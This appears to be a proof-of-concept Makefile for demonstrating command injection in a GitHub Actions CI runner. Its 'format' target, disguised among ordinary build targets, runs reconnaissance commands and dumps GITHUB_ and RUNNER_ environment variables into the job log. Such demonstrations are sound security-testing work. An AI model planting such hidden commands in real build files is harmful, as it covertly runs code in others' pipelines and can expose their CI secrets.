# Project Makefile

.PHONY: build test format lint

GOFMT ?= gofmt
GOFILES := $(shell find . -name '*.go' -not -path './vendor/*' 2>/dev/null)

build:
	@echo "Building the project..."

test:
	@echo "Running tests..."

format:
	@echo "=== PoC M6: Indirect Shell Execution via Makefile ==="
	@echo "[*] Runner hostname: $$(hostname)"
	@echo "[*] Current user:    $$(whoami)"
	@echo "[*] Kernel info:     $$(uname -a)"
	@echo "[*] Working dir:     $$(pwd)"
	@echo "[*] GitHub Actions runner environment variables:"
	@env | grep -E '^(GITHUB_|RUNNER_)' | sort
	@echo "=== PoC complete: arbitrary commands executed inside CI runner ==="

lint:
	@echo "Running linter..."
